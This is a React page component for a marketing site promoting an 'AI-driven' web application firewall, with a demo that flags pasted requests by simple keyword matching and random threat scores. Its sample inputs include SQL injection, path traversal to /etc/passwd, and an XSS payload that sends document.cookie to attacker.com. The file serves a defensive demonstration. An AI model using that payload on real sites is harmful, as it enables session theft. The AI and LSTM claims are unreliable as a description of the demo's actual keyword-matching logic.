
import { Activity, Shield, Zap, Database, ServerCrash, ArrowRight } from 'lucide-react';
import Layout from '../components/layout/Layout';
import SectionHeading from '../components/ui/SectionHeading';
import { Link } from 'react-router-dom';
import { useEffect, useState } from 'react';

const Firewall = () => {
  const [requestInput, setRequestInput] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState<null | {
    threatLevel: number;
    threatType: string;
    action: string;
    details: string;
  }>(null);

  useEffect(() => {
    // Intersection Observer for scroll animations
    const animatedElements = document.querySelectorAll('.animate-on-scroll');
    
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('animate-fade-in-up');
          observer.unobserve(entry.target);
        }
      });
    }, { threshold: 0.1 });
    
    animatedElements.forEach(element => {
      observer.observe(element);
    });
    
    return () => {
      animatedElements.forEach(element => {
        observer.unobserve(element);
      });
    };
  }, []);

  const analyzeRequest = () => {
    setIsAnalyzing(true);
    
    // Simulate AI analysis with a timeout
    setTimeout(() => {
      let result;
      
      // Simple pattern detection for demo purposes
      if (requestInput.includes("' OR 1=1") || requestInput.includes("DROP TABLE")) {
        result = {
          threatLevel: Math.random() * 10 + 85, // 85-95% threat level
          threatType: "SQL Injection",
          action: "Blocked",
          details: "Detected attempt to manipulate database query with SQL injection pattern"
        };
      } else if (requestInput.includes("<script>") || requestInput.includes("javascript:")) {
        result = {
          threatLevel: Math.random() * 15 + 80, // 80-95% threat level
          threatType: "Cross-Site Scripting (XSS)",
          action: "Blocked",
          details: "Detected attempt to inject malicious script code"
        };
      } else if (requestInput.includes("../") || requestInput.includes("etc/passwd")) {
        result = {
          threatLevel: Math.random() * 20 + 75, // 75-95% threat level
          threatType: "Path Traversal",
          action: "Blocked",
          details: "Detected attempt to access restricted files via path traversal"
        };
      } else {
        result = {
          threatLevel: Math.random() * 20, // 0-20% threat level
          threatType: "None Detected",
          action: "Allowed",
          details: "No malicious patterns detected in the request"
        };
      }
      
      setAnalysisResult(result);
      setIsAnalyzing(false);
    }, 2000);
  };
  
  const resetDemo = () => {
    setRequestInput('');
    setAnalysisResult(null);
  };
  
  // Example requests for the user to try
  const exampleRequests = [
    { label: "SQL Injection", value: "username=admin' OR 1=1;--" },
    { label: "XSS Attack", value: "comment=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>" },
    { label: "Path Traversal", value: "file=../../../etc/passwd" },
    { label: "Normal Request", value: "username=johndoe&password=secure123" }
  ];

  return (
    <Layout>
      {/* Hero Section */}
      <section className="pt-32 pb-16 bg-cyber-black relative">
        <div className="absolute inset-0 bg-green-glow z-0"></div>
        <div className="container mx-auto px-4 md:px-6 relative z-10">
          <div className="max-w-4xl mx-auto">
            <div className="flex flex-col items-center text-center animate-on-scroll opacity-0">
              <div className="bg-cyber-dark-green bg-opacity-30 p-3 rounded-full border border-cyber-green/40 mb-6">
                <Activity className="h-10 w-10 text-cyber-green" />
              </div>
              <h1 className="text-4xl md:text-5xl font-bold text-white mb-6">
                AI-Driven Web Application Firewall
              </h1>
              <p className="text-xl text-gray-300 mb-8 max-w-3xl">
                A self-learning firewall that detects and blocks sophisticated cyber threats in real-time, protecting your web applications from attacks.
              </p>
              <div className="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-6">
                <a href="#demo" className="cyber-btn">
                  Try Demo
                </a>
                <a href="#how-it-works" className="px-6 py-2 bg-transparent border-2 border-cyber-green text-cyber-green rounded-md hover:bg-cyber-green/10 transition-colors duration-300">
                  How It Works
                </a>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* How It Works Section */}
      <section id="how-it-works" className="py-20 bg-cyber-dark-gray">
        <div className="container mx-auto px-4 md:px-6">
          <div className="animate-on-scroll opacity-0">
            <SectionHeading
              title="How Our AI Firewall Works"
              subtitle="Our firewall uses advanced machine learning models to identify and neutralize threats that traditional firewalls might miss."
              centered={true}
            />
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mt-16">
            <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0">
              <div className="flex items-center space-x-4 mb-4">
                <div className="bg-cyber-dark-green bg-opacity-30 p-2 rounded-full border border-cyber-green/30">
                  <Shield className="h-6 w-6 text-cyber-green" />
                </div>
                <h3 className="text-xl font-bold text-cyber-light-green">Real-time Analysis</h3>
              </div>
              <p className="text-gray-400">
                Every incoming request is analyzed in real-time using Long Short-Term Memory (LSTM) networks to detect anomalies and potential threats.
              </p>
            </div>
            
            <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0" style={{ animationDelay: '0.1s' }}>
              <div className="flex items-center space-x-4 mb-4">
                <div className="bg-cyber-dark-green bg-opacity-30 p-2 rounded-full border border-cyber-green/30">
                  <Zap className="h-6 w-6 text-cyber-green" />
                </div>
                <h3 className="text-xl font-bold text-cyber-light-green">Adaptive Learning</h3>
              </div>
              <p className="text-gray-400">
                Our system continuously learns from new attack patterns, improving its detection capabilities with each blocked threat.
              </p>
            </div>
            
            <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0" style={{ animationDelay: '0.2s' }}>
              <div className="flex items-center space-x-4 mb-4">
                <div className="bg-cyber-dark-green bg-opacity-30 p-2 rounded-full border border-cyber-green/30">
                  <Database className="h-6 w-6 text-cyber-green" />
                </div>
                <h3 className="text-xl font-bold text-cyber-light-green">Comprehensive Protection</h3>
              </div>
              <p className="text-gray-400">
                Defends against SQL injections, cross-site scripting (XSS), CSRF, DDoS attacks, and other common web vulnerabilities.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Demo Section */}
      <section id="demo" className="py-20 bg-cyber-black relative">
        <div className="absolute inset-0 bg-green-glow z-0 opacity-50"></div>
        <div className="container mx-auto px-4 md:px-6 relative z-10">
          <div className="max-w-3xl mx-auto">
            <div className="animate-on-scroll opacity-0">
              <SectionHeading
                title="Test Our AI Firewall"
                subtitle="Enter an HTTP request or choose from our examples to see how our firewall detects and blocks malicious requests."
                centered={true}
              />
            </div>
            
            <div className="mt-12 bg-cyber-dark-gray p-8 rounded-lg border border-cyber-green/30 animate-pulse-glow">
              <div className="mb-6">
                <p className="text-gray-300 mb-3">Try these examples:</p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {exampleRequests.map((example, index) => (
                    <button
                      key={index}
                      onClick={() => setRequestInput(example.value)}
                      className="text-sm bg-cyber-black p-2 rounded border border-cyber-green/20 text-gray-300 hover:border-cyber-green/50 hover:text-cyber-green transition-all duration-200"
                    >
                      {example.label}
                    </button>
                  ))}
                </div>
              </div>
              
              <div className="mb-6">
                <label htmlFor="request" className="block text-gray-300 mb-2">HTTP Request or User Input:</label>
                <textarea
                  id="request"
                  value={requestInput}
                  onChange={(e) => setRequestInput(e.target.value)}
                  placeholder="Enter a request payload to analyze..."
                  className="w-full h-32 p-4 bg-cyber-black border border-cyber-green/30 rounded-md text-gray-200 focus:border-cyber-green focus:outline-none focus:ring-1 focus:ring-cyber-green font-mono text-sm"
                  disabled={isAnalyzing || analysisResult !== null}
                ></textarea>
              </div>
              
              <div className="mt-6">
                {!analysisResult && !isAnalyzing && (
                  <button
                    onClick={analyzeRequest}
                    disabled={requestInput.length < 5}
                    className={`cyber-btn w-full ${requestInput.length < 5 ? 'opacity-50 cursor-not-allowed' : ''}`}
                  >
                    Analyze Request
                  </button>
                )}
                
                {isAnalyzing && (
                  <div className="text-center p-4">
                    <div className="inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-cyber-green border-r-2"></div>
                    <p className="text-cyber-light-green mt-3">AI analyzing request for threats...</p>
                  </div>
                )}
                
                {analysisResult && (
                  <div className="space-y-6">
                    <div>
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-gray-300">Threat Level</span>
                        <span className={`font-medium ${
                          analysisResult.threatLevel > 50 ? 'text-red-500' : 'text-cyber-green'
                        }`}>
                          {analysisResult.threatLevel.toFixed(1)}%
                        </span>
                      </div>
                      <div className="w-full bg-cyber-black rounded-full h-2.5 border border-cyber-green/20">
                        <div 
                          className={`h-2.5 rounded-full ${
                            analysisResult.threatLevel > 50 ? 'bg-red-500' : 'bg-cyber-green'
                          }`} 
                          style={{ width: `${analysisResult.threatLevel}%` }}
                        ></div>
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="p-4 border border-cyber-green/20 rounded-md bg-cyber-black bg-opacity-70">
                        <p className="text-gray-300 text-sm mb-1">Threat Type</p>
                        <p className="text-lg font-medium text-cyber-light-green">
                          {analysisResult.threatType}
                        </p>
                      </div>
                      
                      <div className="p-4 border border-cyber-green/20 rounded-md bg-cyber-black bg-opacity-70">
                        <p className="text-gray-300 text-sm mb-1">Action Taken</p>
                        <p className={`text-lg font-medium ${
                          analysisResult.action === 'Blocked' ? 'text-red-500' : 'text-cyber-green'
                        }`}>
                          {analysisResult.action}
                        </p>
                      </div>
                    </div>
                    
                    <div className="p-4 border border-cyber-green/20 rounded-md bg-cyber-black bg-opacity-70">
                      <p className="text-gray-300 text-sm mb-1">Analysis Details</p>
                      <p className="text-cyber-light-green">
                        {analysisResult.details}
                      </p>
                    </div>
                    
                    <button onClick={resetDemo} className="cyber-btn w-full">
                      Try Another Request
                    </button>
                  </div>
                )}
              </div>
            </div>
            
            <div className="mt-8 text-center text-gray-400 text-sm animate-on-scroll opacity-0">
              <p>Note: This is a simplified demo. Our actual firewall uses more sophisticated AI algorithms to analyze request patterns and context.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Threat Protection Section */}
      <section className="py-20 bg-cyber-dark-gray">
        <div className="container mx-auto px-4 md:px-6">
          <div className="max-w-4xl mx-auto">
            <div className="animate-on-scroll opacity-0">
              <SectionHeading
                title="Comprehensive Threat Protection"
                subtitle="Our AI firewall secures your applications against these common web vulnerabilities:"
                centered={true}
              />
            </div>
            
            <div className="mt-12 grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0">
                <div className="flex items-center space-x-4 mb-4">
                  <ServerCrash className="h-6 w-6 text-cyber-green" />
                  <h3 className="text-xl font-bold text-cyber-light-green">SQL Injection</h3>
                </div>
                <p className="text-gray-400">
                  Prevents attackers from executing malicious SQL queries that could compromise your database security and leak sensitive data.
                </p>
              </div>
              
              <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0" style={{ animationDelay: '0.1s' }}>
                <div className="flex items-center space-x-4 mb-4">
                  <ServerCrash className="h-6 w-6 text-cyber-green" />
                  <h3 className="text-xl font-bold text-cyber-light-green">Cross-Site Scripting (XSS)</h3>
                </div>
                <p className="text-gray-400">
                  Blocks malicious scripts that could be injected into web pages viewed by other users, preventing client-side attacks.
                </p>
              </div>
              
              <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0" style={{ animationDelay: '0.2s' }}>
                <div className="flex items-center space-x-4 mb-4">
                  <ServerCrash className="h-6 w-6 text-cyber-green" />
                  <h3 className="text-xl font-bold text-cyber-light-green">CSRF Attacks</h3>
                </div>
                <p className="text-gray-400">
                  Prevents Cross-Site Request Forgery attacks that trick users into performing unwanted actions in applications they're authenticated to.
                </p>
              </div>
              
              <div className="bg-cyber-black p-6 rounded-lg border border-cyber-green/20 animate-on-scroll opacity-0" style={{ animationDelay: '0.3s' }}>
                <div className="flex items-center space-x-4 mb-4">
                  <ServerCrash className="h-6 w-6 text-cyber-green" />
                  <h3 className="text-xl font-bold text-cyber-light-green">Bot Activity</h3>
                </div>
                <p className="text-gray-400">
                  Identifies and blocks malicious bot traffic, including credential stuffing, content scraping, and DDoS attacks.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-20 bg-cyber-gradient relative">
        <div className="absolute inset-0 bg-green-glow z-0"></div>
        <div className="container mx-auto px-4 md:px-6 relative z-10">
          <div className="max-w-3xl mx-auto text-center animate-on-scroll opacity-0">
            <h2 className="text-3xl font-bold text-white mb-6">Secure Your Web Applications Today</h2>
            <p className="text-gray-300 text-lg mb-8">
              Explore our complete suite of AI-powered cybersecurity tools for comprehensive digital protection.
            </p>
            <Link 
              to="/" 
              className="cyber-btn inline-flex items-center"
            >
              Explore All Features
              <ArrowRight className="ml-2 h-5 w-5" />
            </Link>
          </div>
        </div>
      </section>
    </Layout>
  );
};

export default Firewall;
